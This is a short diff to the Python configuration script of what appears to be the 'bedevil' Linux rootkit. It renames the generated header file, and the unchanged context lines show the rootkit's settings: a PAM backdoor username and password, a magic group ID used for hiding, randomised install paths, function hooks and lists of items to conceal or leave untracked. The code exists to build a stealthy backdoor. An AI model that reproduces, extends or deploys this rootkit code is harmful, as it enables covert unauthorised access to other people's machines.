@@ -432,8 +432,8 @@ INC        = 'inc'
 CONFIGH    = INC + '/config.h'
 HOOKS_PATH = INC + '/hooks/libdl/hooks' # list of everything we're hooking & the libraries they originate from.
 
-BDVLH = INC + '/bedevil.h'
-SETTINGS = { # all of these are written to bedevil.h. if a value is None it is skipped.
+BDVLH = INC + '/bdv.h'
+SETTINGS = { # all of these are written to bdv.h. if a value is None it is skipped.
     'PAM_UNAME':PAM_UNAME,                   'BACKDOOR_PASS':ut.cryptpw(BACKDOOR_PASS),
     'MAGIC_GID':MAGIC_GID,                   'BD_VAR':ut.randgarb(auppercase, 16),
     'INSTALL_DIR':INSTALL_DIR,               'HOMEDIR':ut.randpath(17),
@@ -537,7 +537,7 @@ def setup_config():
     h = Hooks()
     gotbdvlh = h.readhooks()
 
-    # get all settings & values for bedevil.h
+    # get all settings & values for bdv.h
     KEYS, VALUES = list(SETTINGS.keys()), list(SETTINGS.values())
     for settingi in range(len(SETTINGS)):
         target, value = KEYS[settingi], VALUES[settingi]
@@ -586,7 +586,7 @@ def setup_config():
     linksrc = list(LINKPATHS.keys())
     linkdest = list(LINKPATHS.values())
 
-    bdvlarrays = { # write all of these lists to bedevil.h as arrays of char pointers
+    bdvlarrays = { # write all of these lists to bdv.h as arrays of char pointers
         'linksrcs':linksrc,                 'linkdests':linkdest,
         'unsetvars':unsetvars,              'bdvpaths':listconditional(BDVLPATHS),
         'notrack':listconditional(NOTRACK), 'validpkgmans':validpkgmans,
